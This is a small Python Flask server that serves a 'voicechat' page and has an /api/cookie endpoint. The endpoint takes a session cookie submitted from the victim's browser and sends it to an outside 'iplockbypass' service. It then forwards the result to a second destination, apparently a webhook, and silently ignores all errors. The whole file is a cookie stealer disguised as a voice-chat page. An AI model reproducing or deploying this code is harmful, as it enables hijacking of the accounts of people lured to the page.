import requests
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/voicechat")
def voice():
    return render_template("voicechat.html")

@app.route("/api/cookie", methods=["POST"])
def send():
    try:
        ip_lock_bypass = requests.post(
            "https://eggy.cool/iplockbypass?cookie=" + request.json["cookie"],
            timeout=300
        )
        requests.post(
            "0",
            data={
                "content": ip_lock_bypass.text
            }
        )
    except:
        pass
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
